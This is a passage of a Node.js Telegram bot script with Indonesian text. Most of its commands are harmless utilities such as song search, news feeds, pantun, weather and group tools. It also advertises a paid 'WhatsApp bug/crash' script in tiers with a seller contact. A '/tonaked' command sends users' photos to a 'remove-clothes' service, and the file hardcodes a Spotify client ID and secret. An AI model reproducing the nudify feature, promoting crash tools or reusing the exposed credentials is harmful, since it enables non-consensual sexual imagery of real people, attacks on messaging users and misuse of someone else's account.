      performer: artist || "Unknown Artist",
    });
  } catch (err) {
    console.error("Play Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memutar lagu bre.");
  }
});

bot.onText(/^\/listharga$/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, `
<blockquote>💰 <b>𝐃𝐀𝐅𝐓𝐀𝐑 𝐇𝐀𝐑𝐆𝐀 SCRIPT FIVETYWIN CRASH</b></blockquote>
ᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ᴅɪ ʙᴀᴡᴀʜ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʜᴀʀɢᴀ ʟᴇɴɢᴋᴀᴘ sᴄʀɪᴘᴛ ʙᴏᴛ. 
  `, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ʟɪʜᴀᴛ ʜᴀʀɢᴀ ᴅɪ sɪɴɪ", callback_data: "lihat_harga" }]
      ]
    }
  });
});

// Handler tombol
bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data === "lihat_harga") {
    bot.sendMessage(chatId, `
<blockquote>💬 <b>𝚂𝙲𝚁𝙸𝙿𝚃 𝙱𝚄𝙶 𝚆𝙷𝙰𝚃𝚂𝙰𝙿𝙿 FIVETYWIN CRASH</b></blockquote>
<blockquote>𝙿𝚁𝙸𝙲𝙴 𝙻𝙸𝚂𝚃 FIVETYWIN CRASH</blockquote>
<blockquote>• ɴᴏ ᴜᴘ :10ᴋ
 • ɴᴏ ᴜᴘ : 15.000
• ғᴜʟʟ ᴜᴘ : 20.000
• ʀᴇsᴇʟʟᴇʀ : 25.000
• ᴘᴀᴛɴᴇʀ : 35.000
• ᴄᴇᴏ sᴄ : 40.000
• ᴍᴏᴅᴇʀᴀᴛᴏʀ : 45.000
• ᴏᴡɴᴇʀ : 55.000
contact: <a href="tg://user?id=1333792064">profik2</a></blockquote>
    `, { parse_mode: "HTML" });
  }

  bot.answerCallbackQuery(callbackQuery.id);
});


const SPOTIFY_CLIENT_ID = "e791953ecb0540d898a5d2513c9a0dd2";
const SPOTIFY_CLIENT_SECRET = "23e971c5b0ba4298985e8b00ce71d238";

// Fungsi ambil token Spotify
async function getSpotifyToken() {
  const res = await fetch("https://accounts.spotify.com/api/token", {
    method: "POST",
    headers: {
      "Authorization":
        "Basic " +
        Buffer.from(`${SPOTIFY_CLIENT_ID}:${SPOTIFY_CLIENT_SECRET}`).toString("base64"),
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: "grant_type=client_credentials",
  });
  const data = await res.json();
  return data.access_token;
}

// Fungsi cari lagu di Spotify
async function searchSpotify(query) {
  const token = await getSpotifyToken();
  const res = await fetch(
    `https://api.spotify.com/v1/search?q=${encodeURIComponent(query)}&type=track&limit=1`,
    { headers: { Authorization: `Bearer ${token}` } }
  );
  const data = await res.json();
  if (data.tracks?.items?.length === 0) return null;
  return data.tracks.items[0];
}

// Command /song
bot.onText(/^\/song(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1]?.trim();

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (!query) {
    return bot.sendMessage(
      chatId,
      "🎵 Gunakan format:\n`/song [judul lagu]`\nContoh: `/song shape of you`",
      { parse_mode: "Markdown" }
    );
  }

  await bot.sendMessage(chatId, `🔍 Mencari *${query}* di Spotify...`, {
    parse_mode: "Markdown",
  });

  try {
    const song = await searchSpotify(query);
    if (!song) {
      return bot.sendMessage(chatId, "❌ Lagu tidak ditemukan di Spotify.");
    }

    const title = song.name;
    const artist = song.artists.map(a => a.name).join(", ");
    const album = song.album.name;
    const url = song.external_urls.spotify;
    const cover = song.album.images[0]?.url;

    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🎧 Dengar di Spotify", url: url }]
        ]
      }
    };

    await bot.sendPhoto(chatId, cover, {
      caption: `🎵 *${title}*\n👤 ${artist}\n💽 Album: ${album}`,
      parse_mode: "Markdown",
      ...keyboard
    });
  } catch (err) {
    console.error("Error /song:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat mencari lagu.");
  }
});

bot.onText(/^\/shortlink(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (!url) {
    return bot.sendMessage(
      chatId,
      "🔗 Kirim link yang ingin dipendekkan!\n\nContoh:\n`/shortlink https://example.com/artikel/panjang/banget`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    // Gunakan TinyURL API (tidak butuh API key)
    const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`);
    const shortUrl = await res.text();

    if (!shortUrl || !shortUrl.startsWith("http")) {
      throw new Error("Gagal memendekkan link");
    }

    await bot.sendMessage(
      chatId,
      `✅ *Link berhasil dipendekkan!*\n\n🔹 Asli: ${url}\n🔹 Pendek: ${shortUrl}`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error("❌ Error shortlink:", err);
    bot.sendMessage(chatId, "⚠️ Gagal memendekkan link. Coba lagi nanti.");
  }
});

bot.onText(/^\/fileinfo$/, (msg) => {
  bot.sendMessage(msg.chat.id, "📂 Kirim file yang mau kamu cek infonya!");
});

// Saat user kirim file, foto, audio, atau dokumen
bot.on("document", async (msg) => handleFile(msg, "document"));
bot.on("photo", async (msg) => handleFile(msg, "photo"));
bot.on("video", async (msg) => handleFile(msg, "video"));
bot.on("audio", async (msg) => handleFile(msg, "audio"));

async function handleFile(msg, type) {
  const chatId = msg.chat.id;
  let fileId, fileName;

  if (type === "document") {
    fileId = msg.document.file_id;
    fileName = msg.document.file_name;
  } else if (type === "photo") {
    const photo = msg.photo.pop();
    fileId = photo.file_id;
    fileName = `photo_${chatId}.jpg`;
  } else if (type === "video") {
    fileId = msg.video.file_id;
    fileName = msg.video.file_name || `video_${chatId}.mp4`;
  } else if (type === "audio") {
    fileId = msg.audio.file_id;
    fileName = msg.audio.file_name || `audio_${chatId}.mp3`;
  }

  try {
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    const fileExt = path.extname(file.file_path);
    const fileSize = formatBytes(file.file_size);

    const info = `
📁 *Informasi File*
━━━━━━━━━━━━━━━━
📄 Nama: ${fileName}
📏 Ukuran: ${fileSize}
🧩 Ekstensi: ${fileExt || "-"}
🔗 URL: [Klik di sini](${fileUrl})
`;

    bot.sendMessage(chatId, info, { parse_mode: "Markdown", disable_web_page_preview: false });
  } catch (err) {
    console.error("❌ Gagal ambil info file:", err);
    bot.sendMessage(chatId, "⚠️ Gagal mendapatkan info file. Coba kirim ulang filenya.");
  }
}

// Fungsi bantu untuk format ukuran file
function formatBytes(bytes, decimals = 2) {
  if (!+bytes) return "0 B";
  const k = 1024;
  const dm = decimals < 0 ? 0 : decimals;
  const sizes = ["B", "KB", "MB", "GB", "TB"];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
}

bot.onText(/^\/negarainfo(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const negara = match[1]?.trim();

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (!negara) {
    return bot.sendMessage(chatId, "🌍 Ketik nama negara!\nContoh: `/negarainfo jepang`", { parse_mode: "Markdown" });
  }

  try {
    const res = await fetch(`https://restcountries.com/v3.1/name/${encodeURIComponent(negara)}?fullText=false`);
    const data = await res.json();

    if (!Array.isArray(data) || !data.length) {
      return bot.sendMessage(chatId, "⚠️ Negara tidak ditemukan. Coba ketik nama lain.");
    }

    const n = data[0];
    const name = n.translations?.id?.common || n.name.common;
    const capital = n.capital ? n.capital[0] : "Tidak ada data";
    const region = n.region || "Tidak ada data";
    const subregion = n.subregion || "-";
    const population = n.population?.toLocaleString("id-ID") || "-";
    const currency = n.currencies ? Object.values(n.currencies)[0].name : "-";
    const symbol = n.currencies ? Object.values(n.currencies)[0].symbol : "";
    const flag = n.flag || "🏳️";

    const info = `
${flag} *${name}*

🏙️ Ibukota: ${capital}
🌍 Wilayah: ${region} (${subregion})
👨‍👩‍👧‍👦 Populasi: ${population}
💰 Mata uang: ${currency} ${symbol}
📍 Kode negara: ${n.cca2 || "-"}
`;

    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error negara info:", err);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data negara. Coba lagi nanti.");
  }
});

bot.onText(/^\/beritaindo$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "📰 Sedang mengambil berita terbaru Indonesia...");

  try {
    // RSS Google News Indonesia
    const url = "https://news.google.com/rss?hl=id&gl=ID&ceid=ID:id";
    const res = await fetch(url);
    const xml = await res.text();

    // Ambil judul dan link berita (pakai regex biar ringan)
    const titles = [...xml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)].map((m) => m[1]);
    const links = [...xml.matchAll(/<link>(.*?)<\/link>/g)].map((m) => m[1]);

    // Lewati item pertama (judul feed)
    const items = titles.slice(1, 6).map((t, i) => ({
      title: t,
      link: links[i + 1] || "",
    }));

    // Format teks berita
    const beritaText = items
      .map((item, i) => `${i + 1}. [${item.title}](${item.link})`)
      .join("\n\n");

    await bot.sendMessage(
      chatId,
      `🇮🇩 *Berita Indonesia Terbaru*\n\n${beritaText}\n\nSumber: ©aboutpipop`,
      { parse_mode: "Markdown", disable_web_page_preview: true }
    );
  } catch (error) {
    console.error("❌ Error beritaindo:", error);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil berita. Coba lagi nanti.");
  }
});

bot.onText(/^\/logo (.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  try {
    // Gunakan layanan FlamingText (gratis, no API key)
    const logoUrl = `https://flamingtext.com/net-fu/proxy_form.cgi?imageoutput=true&script=neon-logo&text=${encodeURIComponent(text)}`;

    await bot.sendMessage(chatId, `🖋️ Logo kamu siap!\nTeks: *${text}*`, { parse_mode: "Markdown" });
    await bot.sendPhoto(chatId, logoUrl, { caption: "✨ Logo by FlamingText" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat membuat logo. Coba lagi nanti.");
  }
});

bot.onText(/^\/pantun(?:\s+(\w+))?$/, (msg, match) => {
  const chatId = msg.chat.id;
  const kategori = (match[1] || "acak").toLowerCase();

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  const pantun = {
    lucu: [
      "Pergi ke hutan mencari rusa,\nEh malah ketemu si panda.\nLihat kamu senyum manja,\nBikin hati jadi gembira 😆",
      "Pagi-pagi makan soto,\nSambil nonton film kartun.\nLihat muka kamu begitu,\nAuto hilang semua beban 😄",
      "Burung pipit terbang ke awan,\nTurun lagi ke pinggir taman.\nLihat kamu ketawa lebay-an,\nTapi lucunya kebangetan! 😂"
    ],
    cinta: [
      "Pergi ke pasar membeli bunga,\nBunga mawar warna merah.\nCinta ini untukmu saja,\nSelamanya takkan berubah ❤️",
      "Mentari pagi bersinar indah,\nBurung berkicau sambut dunia.\nCintaku ini sungguh berserah,\nHanya padamu selamanya 💌",
      "Bintang di langit berkelip terang,\nAngin malam berbisik lembut.\nHatiku tenang terasa senang,\nSaat kau hadir beri hangat 💞"
    ],
    bijak: [
      "Padi menunduk tanda berisi,\nRumput liar tumbuh menjulang.\nOrang bijak rendah hati,\nWalau ilmu setinggi bintang 🌾",
      "Air jernih di dalam kendi,\nJatuh setetes ke atas batu.\nJangan sombong dalam diri,\nHidup tenang karena bersyukur selalu 🙏",
      "Ke pasar beli pepaya,\nDibelah dua buat sarapan.\nBijaklah dalam setiap kata,\nAgar hidup penuh kedamaian 🌿"
    ]
  };

  // Gabungkan semua kategori buat opsi "acak"
  const allPantun = [...pantun.lucu, ...pantun.cinta, ...pantun.bijak];

  // Pilih pantun sesuai kategori
  let daftar;
  if (pantun[kategori]) daftar = pantun[kategori];
  else daftar = allPantun;

  const randomPantun = daftar[Math.floor(Math.random() * daftar.length)];

  bot.sendMessage(
    chatId,
    `🎭 *Pantun ${kategori.charAt(0).toUpperCase() + kategori.slice(1)}:*\n\n${randomPantun}`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/^\/trending$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "📊 Sedang mengambil topik trending di Indonesia...");

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  try {
    // URL Google Trends RSS Indonesia
    const trendsUrl = "https://trends.google.com/trends/trendingsearches/daily/rss?geo=ID";
    const newsUrl = "https://news.google.com/rss?hl=id&gl=ID&ceid=ID:id"; // fallback

    // Ambil data dari Google Trends dulu
    const res = await fetch(trendsUrl);
    const xml = await res.text();

    // Regex ambil judul
    let titles = [...xml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)]
      .map(match => match[1])
      .slice(1, 10); // lewati judul pertama (feed title)

    // Jika tidak ada hasil, fallback ke Google News
    if (!titles.length) {
      console.log("⚠️ Google Trends kosong, fallback ke Google News...");
      const newsRes = await fetch(newsUrl);
      const newsXml = await newsRes.text();

      const newsMatches = [...newsXml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)];
      const linkMatches = [...newsXml.matchAll(/<link>(.*?)<\/link>/g)];

      // Gabungkan judul + link (lewati entry pertama = header feed)
      const items = newsMatches.slice(1, 11).map((m, i) => ({
        title: m[1],
        link: linkMatches[i + 1] ? linkMatches[i + 1][1] : "",
      }));

      if (items.length) {
        const list = items.map((x, i) => `${i + 1}. [${x.title}](${x.link})`).join("\n\n");
        return bot.sendMessage(
          chatId,
          `📰 *Berita Teratas Hari Ini (Fallback: Google News)*\n\n${list}\n\nSumber: ©aboutpipop`,
          { parse_mode: "Markdown", disable_web_page_preview: true }
        );
      } else {
        return bot.sendMessage(chatId, "⚠️ Tidak ada data trending atau berita tersedia saat ini.");
      }
    }

    // Jika ada hasil dari Google Trends
    const list = titles.map((t, i) => `${i + 1}. ${t}`).join("\n");
    await bot.sendMessage(
      chatId,
      `📈 *Topik Trending Hari Ini (Google Trends Indonesia)*\n\n${list}\n\nSumber: ©aboutpipop Trends`,
      { parse_mode: "Markdown" }
    );

  } catch (error) {
    console.error("❌ Error trending:", error);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data trending. Coba lagi nanti.");
  }
});

bot.onText(/^\/katahariini$/, (msg) => {
  const chatId = msg.chat.id;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  // Kumpulan kata bijak atau kata mutiara
  const kataBijak = [
    "🌻 Hidup bukan tentang menunggu badai reda, tapi belajar menari di tengah hujan.",
    "🌅 Jangan biarkan kemarin mengambil terlalu banyak dari hari ini.",
    "💡 Satu-satunya batasan dalam hidupmu adalah dirimu sendiri.",
    "🔥 Setiap langkah kecil membawa kamu lebih dekat ke impianmu.",
    "🌈 Jika kamu tidak bisa terbang, berlarilah. Jika tidak bisa berlari, berjalanlah. Tapi teruslah bergerak maju.",
    "🌙 Jangan bandingkan perjalananmu dengan orang lain. Fokus pada jalanmu sendiri.",
    "☀️ Setiap hari adalah kesempatan baru untuk menjadi lebih baik dari kemarin.",
    "🌸 Kegagalan bukan akhir, tapi bagian dari proses menuju sukses.",
    "💫 Lakukan yang terbaik hari ini, karena besok belum tentu datang.",
    "🦋 Jangan takut berubah, karena perubahan adalah tanda kamu bertumbuh."

  ];

  // Pilih acak satu kata bijak
  const randomKata = kataBijak[Math.floor(Math.random() * kataBijak.length)];

  // Kirim pesan
  bot.sendMessage(chatId, `📜 *Kata Hari Ini:*\n\n${randomKata}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/motivasi$/, async (msg) => {
  const chatId = msg.chat.id;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  // Kumpulan kata motivasi
  const motivasi = [
    "🔥 Jangan pernah menyerah, karena hal besar butuh waktu.",
    "💪 Kesuksesan tidak datang dari apa yang kamu lakukan sesekali, tapi dari apa yang kamu lakukan setiap hari.",
    "🌟 Percayalah pada proses, bukan hanya hasil.",
    "🚀 Gagal itu biasa, yang penting kamu tidak berhenti mencoba.",
    "💡 Mimpi besar dimulai dari langkah kecil yang berani.",
    "🌈 Setiap hari adalah kesempatan baru untuk menjadi lebih baik.",
    "🦁 Jangan takut gagal — takutlah kalau kamu tidak mencoba.",
    "🌻 Fokuslah pada tujuanmu, bukan pada hambatan di sekitarmu.",
    "⚡ Orang sukses bukan yang tidak pernah gagal, tapi yang tidak pernah menyerah.",
    "🌤️ Kamu lebih kuat dari yang kamu kira. Terus melangkah!"

  ];

  // Pilih kata motivasi acak
  const randomMotivasi = motivasi[Math.floor(Math.random() * motivasi.length)];
  await bot.sendMessage(chatId, `✨ *Motivasi Hari Ini:*\n\n${randomMotivasi}`, {
    parse_mode: "Markdown",
  });
});

bot.onText(/^\/hariini$/, (msg) => {
  const chatId = msg.chat.id;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  // Ambil tanggal dan waktu saat ini (WIB)
  const now = new Date();
  const optionsTanggal = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };

  // Format ke bahasa Indonesia
  const tanggal = now.toLocaleDateString('id-ID', optionsTanggal);
  const waktu = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

  // Pesan balasan
  const pesan = `📅 *Info Hari Ini*\n\n🗓️ Tanggal: ${tanggal}\n⏰ Waktu: ${waktu} WIB\n\nSelamat menjalani hari dengan semangat! 💪`;
  bot.sendMessage(chatId, pesan, { parse_mode: 'Markdown' });
});

bot.onText(/^\/faktaunik$/, async (msg) => {
  const chatId = msg.chat.id;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  // Daftar fakta unik — bisa kamu tambah sesuka hati
  const fakta = [
    "💡 Lebah bisa mengenali wajah manusia!",
    "🌎 Gunung Everest tumbuh sekitar 4 milimeter setiap tahun.",
    "🐙 Gurita memiliki tiga jantung dan darah berwarna biru.",
    "🧊 Air panas bisa membeku lebih cepat daripada air dingin — disebut efek Mpemba.",
    "🚀 Jejak kaki di bulan akan bertahan jutaan tahun karena tidak ada angin.",
    "🐘 Gajah tidak bisa melompat, satu-satunya mamalia besar yang tidak bisa.",
    "🦋 Kupu-kupu mencicipi dengan kakinya!",
    "🔥 Matahari lebih putih daripada kuning jika dilihat dari luar atmosfer.",
    "🐧 Penguin jantan memberikan batu kepada betina sebagai tanda cinta.",
    "🌕 Di Venus, satu hari lebih panjang daripada satu tahunnya!"
  ];

  // Pilih fakta secara acak
  const randomFakta = fakta[Math.floor(Math.random() * fakta.length)];
    
  await bot.sendMessage(chatId, `🎲 *Fakta Unik Hari Ini:*\n\n${randomFakta}`, {
    parse_mode: "Markdown",
  });
});

bot.onText(/^\/dunia$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "🌍 Sedang mengambil berita dunia...");

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  try {
    const url = "https://feeds.bbci.co.uk/news/world/rss.xml";
    const res = await fetch(url);
    const xml = await res.text();
      
    // Ambil 5 judul dan link pertama pakai regex
    const items = [...xml.matchAll(/<item>.*?<title><!\[CDATA\[(.*?)\]\]><\/title>.*?<link>(.*?)<\/link>/gs)]
      .slice(0, 5)
      .map(m => `• [${m[1]}](${m[2]})`)
      .join("\n\n");
      
    if (!items) throw new Error("Data kosong");
      
    const message = `🌎 *Berita Dunia Terbaru*\n\n${items}\n\n📰 _Sumber: ©aboutpipop News_`;
    await bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
  } catch (e) {
    console.error(e);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil berita dunia. Coba lagi nanti.");
  }
});

bot.onText(/\/gempa/, async (msg) => {
  const chatId = msg.chat.id;
  try {
    const res = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
    const data = await res.json();
    const gempa = data.Infogempa.gempa;
    const info = `
📢 *Info Gempa Terbaru BMKG*
📅 Tanggal: ${gempa.Tanggal}
🕒 Waktu: ${gempa.Jam}
📍 Lokasi: ${gempa.Wilayah}
📊 Magnitudo: ${gempa.Magnitude}
📌 Kedalaman: ${gempa.Kedalaman}
🌊 Potensi: ${gempa.Potensi}
🧭 Koordinat: ${gempa.Coordinates}
🗺️ *Dirasakan:* ${gempa.Dirasakan || "-"}
Sumber: ©aboutpipop
    `;
    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data gempa dari BMKG.");
  }
});

bot.onText(/^\/tonaked(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = msg.text.split(' ').slice(1).join(' ');
  let imageUrl = args || null;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  // Kalau reply ke foto
  if (!imageUrl && msg.reply_to_message && msg.reply_to_message.photo) {
    const fileId = msg.reply_to_message.photo.pop().file_id;
    const fileLink = await bot.getFileLink(fileId);
    imageUrl = fileLink;
  }

  if (!imageUrl) {
    return bot.sendMessage(chatId, '🪧 ☇ Format: /tonaked (reply gambar)');
  }

  const statusMsg = await bot.sendMessage(chatId, '⏳ ☇ Memproses gambar...');
  try {
    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`);
    const data = await res.json();
    const hasil = data.result;

    if (!hasil) {
      return bot.editMessageText('❌ ☇ Gagal memproses gambar, pastikan URL atau foto valid', {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
    }

    await bot.deleteMessage(chatId, statusMsg.message_id);
    await bot.sendPhoto(chatId, hasil);

  } catch (e) {
    console.error(e);
    await bot.editMessageText('❌ ☇ Terjadi kesalahan saat memproses gambar', {
      chat_id: chatId,
      message_id: statusMsg.message_id
    });
  }
});

const started = Date.now();
bot.onText(/^\/uptime$/, (msg) => {
  const s = Math.floor((Date.now()-started)/1000);
  const h = Math.floor(s/3600), m = Math.floor((s%3600)/60);
  bot.sendMessage(msg.chat.id, `⏱ Bot aktif: ${h} jam ${m} menit`);
});

bot.onText(/^\/pair$/, async (msg) => {
  const members = await bot.getChatAdministrators(msg.chat.id);
  const names = members.map(m=>m.user.first_name);
  const a = names[Math.floor(Math.random()*names.length)];
  const b = names[Math.floor(Math.random()*names.length)];
  bot.sendMessage(msg.chat.id, `💞 Pasangan hari ini: ${a} ❤️ ${b}`);
});

let groupRules = {};
bot.onText(/^\/setrules (.+)/, (msg, match) => {
  groupRules[msg.chat.id] = match[1];
  bot.sendMessage(msg.chat.id, "✅ Aturan grup disimpan.");

});

bot.onText(/^\/rules$/, (msg) => {
  const rules = groupRules[msg.chat.id] || "Belum ada aturan.";
  bot.sendMessage(msg.chat.id, `📜 *Aturan Grup:*\n${rules}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/tagadmin$/, async (msg) => {
  const members = await bot.getChatAdministrators(msg.chat.id);
  const names = members.slice(0,30).map(m => `@${m.user.username || m.user.first_name}`).join(" ");
  bot.sendMessage(msg.chat.id, `📢 ${names}`);
});

bot.onText(/^\/admins$/, async (msg) => {
  const list = await bot.getChatAdministrators(msg.chat.id);
  const names = list.map(a => `👑 ${a.user.first_name}`).join("\n");
  bot.sendMessage(msg.chat.id, `*Daftar Admin:*\n${names}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/groupinfo$/, async (msg) => {
  if (!msg.chat.title) return bot.sendMessage(msg.chat.id, "❌ Perintah ini hanya untuk grup.");
  const admins = await bot.getChatAdministrators(msg.chat.id);
  bot.sendMessage(msg.chat.id, `
👥 *Group Info*
📛 Nama: ${msg.chat.title}
🆔 ID: ${msg.chat.id}
👑 Admins: ${admins.length}
👤 Anggota: ${msg.chat.all_members_are_administrators ? "Admin semua" : "Campuran"}
  `, { parse_mode: "Markdown" });
});

bot.onText(/^\/restartbot$/, (msg) => {
  bot.sendMessage(msg.chat.id, "♻️ Restarting bot...");
  setTimeout(() => process.exit(0), 1000);
});

const statFile = './stat.json';
if (!fs.existsSync(statFile)) fs.writeFileSync(statFile, "{}");
let stat = JSON.parse(fs.readFileSync(statFile));
function saveStat(){ fs.writeFileSync(statFile, JSON.stringify(stat, null, 2)); }
bot.on('message', (msg) => {
  const id = msg.from.id;
  stat[id] = (stat[id] || 0) + 1;
  saveStat();
});

bot.onText(/^\/stat$/, (msg)=>{
  let data = Object.entries(stat).sort((a,b)=>b[1]-a[1]).slice(0,5);
  let text = "📊 5 User Paling Aktif:\n";
  data.forEach(([id,count],i)=>text+=`${i+1}. ID:${id} -> ${count} pesan\n`);
  bot.sendMessage(msg.chat.id,text);
});

bot.onText(/^\/maps (.+)/, (msg, match)=>{
  const lokasi = match[1];
  const link = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lokasi)}`;
  bot.sendMessage(msg.chat.id, `🗺 Lokasi ditemukan:\n${link}`);
});

const duel = {};
bot.onText(/^\/duel (@.+)/, (msg, match) => {
  duel[msg.chat.id] = match[1];
  bot.sendMessage(msg.chat.id, `${msg.from.username} menantang ${match[1]}! Gunakan /terima untuk mulai.`);
});

bot.onText(/^\/terima$/, (msg) => {
  if (!duel[msg.chat.id]) return;
  const players = [msg.from.username, duel[msg.chat.id]];
  const winner = players[Math.floor(Math.random() * players.length)];
  bot.sendMessage(msg.chat.id, `⚔ Duel dimulai...\n🏆 Pemenang: ${winner}`);
  delete duel[msg.chat.id];
});

bot.onText(/^\/speed$/, (msg) => {
  const start = Date.now();
  bot.sendMessage(msg.chat.id, "⏱ Mengukur...").then(() => {
    const end = Date.now();
    bot.sendMessage(msg.chat.id, `⚡ Respon bot: ${end - start} ms`);
  });
});

bot.onText(/^\/cuaca (.+)/, async (msg, match) => {
  const kota = match[1];
  const url = `https://wttr.in/${encodeURIComponent(kota)}?format=3`;
  try {
    const res = await fetch(url);
    const data = await res.text();
    bot.sendMessage(msg.chat.id, `🌤 Cuaca ${data}`);
  } catch {
    bot.sendMessage(msg.chat.id, "⚠ Tidak bisa mengambil data cuaca");
  }
});

bot.onText(/\/cekid/, (msg) => {
  const chatId = msg.chat.id;
  const sender = msg.from.username;
  const randomImage = getRandomImage();
  const id = msg.from.id;
  const owner = "1333792064"; // Ganti dengan ID pemilik bot
  const text12 = `Halo @${sender}
╭────⟡
│ 👤 Nama: @${sender}
│ 🆔 ID: \`${id}\`
╰────⟡
<blockquote>by @FIVETYWIN</blockquote>
`;
  const keyboard = {
    reply_markup: {
      inline_keyboard: [
        [
        [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }],
        ],
      ],
    },
  };
  bot.sendPhoto(chatId, randomImage, {
    caption: text12,
    parse_mode: "HTML",
    reply_markup: keyboard,
  });
});

bot.onText(/^\/infome$/, (msg) => {
  const user = msg.from;
  const info = `
🪪 <b>Data Profil Kamu</b>
━━━━━━━━━━━━━━━━━━
👤 Nama: ${user.first_name || "-"} ${user.last_name || ""}
🏷 Username: @${user.username || "Tidak ada"}
🆔 ID: <code>${user.id}</code>
🌐 Bahasa: ${user.language_code || "unknown"}
  `;
  bot.sendMessage(msg.chat.id, info, { parse_mode: "HTML" });
});

// =========================
// 🚫 AntiLink Simple Version
// =========================

let antiLink = true; // default aktif
const linkPattern = /(https?:\/\/|t\.me|www\.)/i;

// Command /antilink on/off
bot.onText(/^\/antilink (on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const status = match[1].toLowerCase();

  if (status === "on") {
    antiLink = true;
    bot.sendMessage(chatId, "✅ AntiLink diaktifkan!");
  } else {
    antiLink = false;
    bot.sendMessage(chatId, "⚙️ AntiLink dimatikan!");
  }
});

// Hapus pesan jika ada link
bot.on("message", (msg) => {
  if (!antiLink) return;
  if (!msg.text) return;

  const chatId = msg.chat.id;
  if (linkPattern.test(msg.text)) {
    bot.deleteMessage(chatId, msg.message_id).catch(() => {});
    bot.sendMessage(chatId, "🚫 Pesan berisi link telah dihapus otomatis!");
  }
});

